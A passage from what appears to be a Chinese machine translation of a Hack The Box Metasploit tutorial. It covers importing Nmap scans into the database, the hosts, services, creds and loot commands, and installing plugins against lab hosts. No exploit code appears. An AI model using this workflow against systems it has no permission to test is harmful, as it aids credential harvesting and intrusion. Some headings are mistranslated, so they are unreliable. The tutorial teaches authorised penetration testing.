class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import Target.xml</span><br><span class="line"></span><br><span class="line">[*] Importing &#x27;Nmap XML&#x27; data</span><br><span class="line">[*] Import: Parsing with &#x27;Nokogiri v1.10.9&#x27;</span><br><span class="line">[*] Importing host 10.10.10.40</span><br><span class="line">[*] Successfully imported ~/Target.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="在-MSF-控制台中使用-Nmap"><a href="#在-MSF-控制台中使用-Nmap" class="headerlink" title="在 MSF 控制台中使用 Nmap"></a>在 MSF 控制台中使用 Nmap</h2><p>或者，我们可以直接从 msfconsole 使用 Nmap！要直接从控制台扫描而无需后台或退出进程，请使用命令<code>db_nmap</code>。</p><h4 id="无国界医生-Nmap"><a href="#无国界医生-Nmap" class="headerlink" title="无国界医生-Nmap"></a>无国界医生-Nmap</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -sS 10.10.10.8</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 21:04 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.8</span><br><span class="line">[*] Nmap: Host is up (0.016s latency).</span><br><span class="line">[*] Nmap: Not shown: 999 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ </span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.8              Unknown                    device         </span><br><span class="line">10.10.10.40             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port   proto  name          state  info</span><br><span class="line">----         ----   -----  ----          -----  ----</span><br><span class="line">10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3</span><br><span class="line">10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn</span><br><span class="line">10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP</span><br><span class="line">10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC</span><br><span class="line">10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>会话结束后，如果 PostgreSQL 服务出现任何问题，请务必备份我们的数据。为此，请使用<code>db_export</code>命令。</p><h4 id="MSF-数据库导出"><a href="#MSF-数据库导出" class="headerlink" title="MSF - 数据库导出"></a>MSF - 数据库导出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_export -h</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br><span class="line">[-] No output file was specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; db_export -f xml backup.xml</span><br><span class="line"></span><br><span class="line">[*] Starting export of workspace default to backup.xml [ xml ]...</span><br><span class="line">[*] Finished export of workspace default to backup.xml [ xml ]...</span><br></pre></td></tr></table></figure><p>以后需要时可以将此数据导回 msfconsole。<code>hosts</code>其他与数据保留相关的命令是、<code>services</code>、<code>creds</code>和命令的扩展使用<code>loot</code>。</p><h2 id="主持"><a href="#主持" class="headerlink" title="主持"></a>主持</h2><p>该<code>hosts</code>命令显示一个数据库表，该表自动填充了主机地址、主机名以及我们在扫描和交互过程中找到的有关这些信息的其他信息。例如，假设<code>msfconsole</code>与可以执行服务和操作系统检测的扫描仪插件链接。在这种情况下，一旦通过 msfconsole 完成扫描，该信息就会自动出现在表中。同样，Nessus、NexPose 或 Nmap 等工具将在这些情况下为我们提供帮助。</p><p>主机也可以手动添加为该表中的单独条目。添加我们的自定义主机后，我们还可以组织表格的格式和结构、添加评论、更改现有信息等等。</p><h4 id="MSF-存储主机"><a href="#MSF-存储主机" class="headerlink" title="MSF - 存储主机"></a>MSF - 存储主机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; hosts -h</span><br><span class="line"></span><br><span class="line">Usage: hosts [ options ] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">  -a,--add          Add the hosts instead of searching</span><br><span class="line">  -d,--delete       Delete the hosts instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns (see list below)</span><br><span class="line">  -C &lt;col1,col2&gt;    Only show the given columns until the next restart (see list below)</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -u,--up           Only show hosts which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in CSV format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -i,--info         Change the info of a host</span><br><span class="line">  -n,--name         Change the name of a host</span><br><span class="line">  -m,--comment      Change the comment of a host</span><br><span class="line">  -t,--tag          Add or specify a tag to a range of hosts</span><br><span class="line"></span><br><span class="line">Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags</span><br></pre></td></tr></table></figure><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>该<code>services</code>命令的功能与前一个命令相同。它包含一个表格，其中包含有关在扫描或交互过程中发现的服务的描述和信息。与上面的命令一样，这里的条目是高度可定制的。</p><h4 id="MSF-主机的存储服务"><a href="#MSF-主机的存储服务" class="headerlink" title="MSF - 主机的存储服务"></a>MSF - 主机的存储服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; services -h</span><br><span class="line"></span><br><span class="line">Usage: services [-h] [-u] [-a] [-r &lt;proto&gt;] [-p &lt;port1,port2&gt;] [-s &lt;name1,name2&gt;] [-o &lt;filename&gt;] [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add the services instead of searching</span><br><span class="line">  -d,--delete       Delete the services instead of searching</span><br><span class="line">  -c &lt;col1,col2&gt;    Only show the given columns</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -s &lt;name&gt;         Name of the service to add</span><br><span class="line">  -p &lt;port&gt;         Search for a list of ports</span><br><span class="line">  -r &lt;protocol&gt;     Protocol type of the service being added [tcp|udp]</span><br><span class="line">  -u,--up           Only show services which are up</span><br><span class="line">  -o &lt;file&gt;         Send output to a file in csv format</span><br><span class="line">  -O &lt;column&gt;       Order rows by specified column number</span><br><span class="line">  -R,--rhosts       Set RHOSTS from the results of the search</span><br><span class="line">  -S,--search       Search string to filter by</span><br><span class="line">  -U,--update       Update data for existing service</span><br><span class="line"></span><br><span class="line">Available columns: created_at, info, name, port, proto, state, updated_at</span><br></pre></td></tr></table></figure><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>该<code>creds</code>命令允许您可视化在与目标主机交互期间收集的凭据。我们还可以手动添加凭据，将现有凭据与端口规范匹配，添加描述等。</p><h4 id="MSF-存储凭证"><a href="#MSF-存储凭证" class="headerlink" title="MSF - 存储凭证"></a>MSF - 存储凭证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; creds -h</span><br><span class="line"></span><br><span class="line">With no sub-command, list credentials. If an address range is</span><br><span class="line">given, show only credentials with logins on hosts within that</span><br><span class="line">range.</span><br><span class="line"></span><br><span class="line">Usage - Listing credentials:</span><br><span class="line">  creds [filter options] [address range]</span><br><span class="line"></span><br><span class="line">Usage - Adding credentials:</span><br><span class="line">  creds add uses the following named parameters.</span><br><span class="line">    user      :  Public, usually a username</span><br><span class="line">    password  :  Private, private_type Password.</span><br><span class="line">    ntlm      :  Private, private_type NTLM Hash.</span><br><span class="line">    Postgres  :  Private, private_type Postgres MD5</span><br><span class="line">    ssh-key   :  Private, private_type SSH key, must be a file path.</span><br><span class="line">    hash      :  Private, private_type Nonreplayable hash</span><br><span class="line">    jtr       :  Private, private_type John the Ripper hash type.</span><br><span class="line">    realm     :  Realm, </span><br><span class="line">    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.</span><br><span class="line"></span><br><span class="line">Examples: Adding</span><br><span class="line">   # Add a user, password and realm</span><br><span class="line">   creds add user:admin password:notpassword realm:workgroup</span><br><span class="line">   # Add a user and password</span><br><span class="line">   creds add user:guest password:&#x27;guest password&#x27;</span><br><span class="line">   # Add a password</span><br><span class="line">   creds add password:&#x27;password without username&#x27;</span><br><span class="line">   # Add a user with an NTLMHash</span><br><span class="line">   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a NTLMHash</span><br><span class="line">   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A</span><br><span class="line">   # Add a Postgres MD5</span><br><span class="line">   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860</span><br><span class="line">   # Add a user with an SSH key</span><br><span class="line">   creds add user:sshadmin ssh-key:/path/to/id_rsa</span><br><span class="line">   # Add a user and a NonReplayableHash</span><br><span class="line">   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5</span><br><span class="line">   # Add a NonReplayableHash</span><br><span class="line">   creds add hash:d19c32489b870735b5f587d76b934283</span><br><span class="line"></span><br><span class="line">General options</span><br><span class="line">  -h,--help             Show this help information</span><br><span class="line">  -o &lt;file&gt;             Send output to a file in csv/jtr (john the ripper) format.</span><br><span class="line">                        If the file name ends in &#x27;.jtr&#x27;, that format will be used.</span><br><span class="line">                        If file name ends in &#x27;.hcat&#x27;, the hashcat format will be used.</span><br><span class="line">                        CSV by default.</span><br><span class="line">  -d,--delete           Delete one or more credentials</span><br><span class="line"></span><br><span class="line">Filter options for listing</span><br><span class="line">  -P,--password &lt;text&gt;  List passwords that match this text</span><br><span class="line">  -p,--port &lt;portspec&gt;  List creds with logins on services matching this port spec</span><br><span class="line">  -s &lt;svc names&gt;        List creds matching comma-separated service names</span><br><span class="line">  -u,--user &lt;text&gt;      List users that match this text</span><br><span class="line">  -t,--type &lt;type&gt;      List creds that match the following types: password,ntlm,hash</span><br><span class="line">  -O,--origins &lt;IP&gt;     List creds that match these origins</span><br><span class="line">  -R,--rhosts           Set RHOSTS from the results of the search</span><br><span class="line">  -v,--verbose          Don&#x27;t truncate long password hashes</span><br><span class="line"></span><br><span class="line">Examples, John the Ripper hash types:</span><br><span class="line">  Operating Systems (starts with)</span><br><span class="line">    Blowfish ($2a$)   : bf</span><br><span class="line">    BSDi     (_)      : bsdi</span><br><span class="line">    DES               : des,crypt</span><br><span class="line">    MD5      ($1$)    : md5</span><br><span class="line">    SHA256   ($5$)    : sha256,crypt</span><br><span class="line">    SHA512   ($6$)    : sha512,crypt</span><br><span class="line">  Databases</span><br><span class="line">    MSSQL             : mssql</span><br><span class="line">    MSSQL 2005        : mssql05</span><br><span class="line">    MSSQL 2012/2014   : mssql12</span><br><span class="line">    MySQL &lt; 4.1       : mysql</span><br><span class="line">    MySQL &gt;= 4.1      : mysql-sha1</span><br><span class="line">    Oracle            : des,oracle</span><br><span class="line">    Oracle 11         : raw-sha1,oracle11</span><br><span class="line">    Oracle 11 (H type): dynamic_1506</span><br><span class="line">    Oracle 12c        : oracle12c</span><br><span class="line">    Postgres          : postgres,raw-md5</span><br><span class="line"></span><br><span class="line">Examples, listing:</span><br><span class="line">  creds               # Default, returns all credentials</span><br><span class="line">  creds 1.2.3.4/24    # Return credentials with logins in this range</span><br><span class="line">  creds -O 1.2.3.4/24 # Return credentials with origins in this range</span><br><span class="line">  creds -p 22-25,445  # nmap port specification</span><br><span class="line">  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services</span><br><span class="line">  creds -t NTLM       # All NTLM creds</span><br><span class="line">  creds -j md5        # All John the Ripper hash type MD5 creds</span><br><span class="line"></span><br><span class="line">Example, deleting:</span><br><span class="line">  # Delete all SMB credentials</span><br><span class="line">  creds -d -s smb</span><br></pre></td></tr></table></figure><h2 id="抢劫"><a href="#抢劫" class="headerlink" title="抢劫"></a>抢劫</h2><p>该<code>loot</code>命令与上面的命令结合使用，为您提供拥有的服务和用户的一目了然的列表。在这种情况下，战利品指的是来自不同系统类型的哈希转储，即哈希、密码、影子等。</p><h4 id="MSF–-存储战利品"><a href="#MSF–-存储战利品" class="headerlink" title="MSF– 存储战利品"></a>MSF– 存储战利品</h4><p> MSF– 存储战利品</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; loot -h</span><br><span class="line"></span><br><span class="line">Usage: loot [options]</span><br><span class="line"> Info: loot [-h] [addr1 addr2 ...] [-t &lt;type1,type2&gt;]</span><br><span class="line">  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]</span><br><span class="line">  Del: loot -d [addr1 addr2 ...]</span><br><span class="line"></span><br><span class="line">  -a,--add          Add loot to the list of addresses, instead of listing</span><br><span class="line">  -d,--delete       Delete *all* loot matching host and type</span><br><span class="line">  -f,--file         File with contents of the loot to add</span><br><span class="line">  -i,--info         Info of the loot to add</span><br><span class="line">  -t &lt;type1,type2&gt;  Search for a list of types</span><br><span class="line">  -h,--help         Show this help information</span><br><span class="line">  -S,--search       Search string to filter by</span><br></pre></td></tr></table></figure><h2 id="插件-1"><a href="#插件-1" class="headerlink" title="插件"></a>插件</h2><p>插件是第三方已经发布的现成软件，并已批准 Metasploit 的创建者将他们的软件集成到框架中。这些可以代表免费使用但功能有限的商业产品<code>Community Edition</code>，或者它们可以是由个人开发的个人项目。</p><p>插件的使用使渗透测试人员的生活更加轻松，将知名软件的功能带入<code>msfconsole</code>Metasploit Pro 环境。以前，我们需要在不同的软件之间循环导入和导出结果，一遍又一遍地设置选项和参数，现在，通过使用插件，msfconsole 会自动将所有内容记录到我们正在使用的数据库以及主机、服务和漏洞一目了然供用户使用。<a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Plugin">插件</a>直接与 API 一起工作，可用于操作整个框架。它们可用于自动执行重复性任务、向 中添加新命令<code>msfconsole</code>以及扩展已经很强大的框架。</p><h3 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h3><p>要开始使用插件，我们需要确保它安装在我们机器上的正确目录中。导航到<code>/usr/share/metasploit-framework/plugins</code>，这是每个新安装的默认目录<code>msfconsole</code>，应该向我们展示我们有哪些可用的插件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb</span><br><span class="line">alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb</span><br><span class="line">auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb</span><br></pre></td></tr></table></figure><p>如果在此处找到该插件，我们可以在内部启动它<code>msfconsole</code>，然后会看到该特定插件的问候输出，表明它已成功加载并可以使用了：</p><h3 id="MSF-加载-Nessus"><a href="#MSF-加载-Nessus" class="headerlink" title="MSF - 加载 Nessus"></a>MSF - 加载 Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load nessus</span><br><span class="line"></span><br><span class="line">[*] Nessus Bridge for Metasploit</span><br><span class="line">[*] Type nessus_help for a command listing</span><br><span class="line">[*] Successfully loaded Plugin: Nessus</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; nessus_help</span><br><span class="line"></span><br><span class="line">Command                     Help Text</span><br><span class="line">-------                     ---------</span><br><span class="line">Generic Commands            </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_connect              Connect to a Nessus server</span><br><span class="line">nessus_logout               Logout from the Nessus server</span><br><span class="line">nessus_login                Login into the connected Nessus server with a different username and </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">nessus_user_del             Delete a Nessus User</span><br><span class="line">nessus_user_passwd          Change Nessus Users Password</span><br><span class="line">                            </span><br><span class="line">Policy Commands             </span><br><span class="line">-----------------           -----------------</span><br><span class="line">nessus_policy_list          List all polciies</span><br><span class="line">nessus_policy_del           Delete a policy</span><br></pre></td></tr></table></figure><p>如果插件安装不正确，我们将在尝试加载时收到以下错误。</p><p> MSF - 加载 Nessus</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; load Plugin_That_Does_Not_Exist</span><br><span class="line"></span><br><span class="line">[-] Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb: cannot load such file -- /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist.rb</span><br></pre></td></tr></table></figure><p>要开始使用该插件，请开始在该特定插件的帮助菜单中发出我们可用的命令。每个跨平台集成都为我们提供了一组独特的交互，我们可以在评估期间使用这些交互，因此在使用它们之前仔细阅读每一个交互是很有帮助的，这样可以最大限度地利用它们。</p><h3 id="安装新插件"><a href="#安装新插件" class="headerlink" title="安装新插件"></a>安装新插件</h3><p>Parrot OS 发行版的每次更新都会安装新的、更受欢迎的插件，因为它们由其制造商向公众推出，收集在 Parrot 更新存储库中。<code>/usr/share/metasploit-framework/plugins</code>要安装未包含在发行版新更新中的新自定义插件，我们可以获取制造商页面上提供的 .rb 文件，并将其放置在具有适当权限的文件夹中。</p><p>例如，让我们尝试安装<a href="https://github.com/darkoperator/Metasploit-Plugins.git">DarkOperator 的 Metasploit-Plugins</a>。然后，按照上面的链接，我们得到几个 Ruby ( <code>.rb</code>) 文件，我们可以直接将它们放在上面提到的文件夹中。</p><h3 id="下载-MSF-插件"><a href="#下载-MSF-插件" class="headerlink" title="下载 MSF 插件"></a>下载 MSF 插件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins</span><br><span class="line">vnswer77@htb[/htb]$ ls Metasploit-Plugins</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb</span><br><span class="line">alias.rb           komand.rb      pentest.rb           thread.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           token_adduser.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            twitt.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br><span class="line">growl.rb           openvas.rb     sounds.rb</span><br></pre></td></tr></table></figure><p>这里我们可以以插件<code>pentest.rb</code>为例，复制到<code>/usr/share/metasploit-framework/plugins</code>.</p><h4 id="MSF-将插件复制到-MSF"><a href="#MSF-将插件复制到-MSF" class="headerlink" title="MSF - 将插件复制到 MSF"></a>MSF - 将插件复制到 MSF</h4><p> MSF - 将插件复制到 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb</span><br></pre></td></tr></table></figure><p>然后，<code>msfconsole</code>通过运行命令启动并检查插件的安装<code>load</code>。加载插件后， at<code>help menu</code>会<code>msfconsole</code>自动扩展附加功能。</p><h4 id="MSF-加载插件"><a href="#MSF-加载插件" class="headerlink" title="MSF - 加载插件"></a>MSF - 加载插件</h4><p> MSF - 加载插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 